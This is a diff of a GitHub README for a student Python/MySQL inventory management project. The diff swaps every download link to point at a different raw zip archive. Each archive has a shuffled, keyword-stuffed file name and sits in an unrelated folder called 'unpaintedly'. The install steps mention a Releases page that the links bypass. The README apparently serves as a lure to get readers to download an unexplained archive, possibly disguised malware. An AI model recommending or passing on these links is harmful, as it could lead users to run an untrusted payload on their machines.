@@ -1,6 +1,6 @@
 # 🛠️ inventory-management-system-python-mysql - Effortlessly Manage Your Inventory
 
-[![Download](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/inventory_python_management_mysql_system_Phillis.zip)](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/inventory_python_management_mysql_system_Phillis.zip)
+[![Download](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/python-system-management-inventory-mysql-1.4.zip)](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/python-system-management-inventory-mysql-1.4.zip)
 
 ## 📋 Overview
 The Inventory Management System is a practical project designed for students studying computer science. This system allows users to track and manage inventory easily, enabling swift operations and organized record-keeping.
@@ -23,7 +23,7 @@ Running this application is simple. Follow these steps to download and begin usi
 ## 📥 Download & Install
 To get started, visit this page to download the Inventory Management System:
 
-[Download the Inventory Management System](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/inventory_python_management_mysql_system_Phillis.zip)
+[Download the Inventory Management System](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/python-system-management-inventory-mysql-1.4.zip)
 
 1. Go to the Releases page.
 2. Find the latest version.
@@ -91,6 +91,6 @@ This project covers various concepts useful for learners in computer science and
 - python
 - mysql
 
-Visit this page to download: [Download the Inventory Management System](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/inventory_python_management_mysql_system_Phillis.zip) 
+Visit this page to download: [Download the Inventory Management System](https://github.com/youssefnasri7/inventory-management-system-python-mysql/raw/refs/heads/main/unpaintedly/python-system-management-inventory-mysql-1.4.zip) 
 
 Take control of your inventory today!
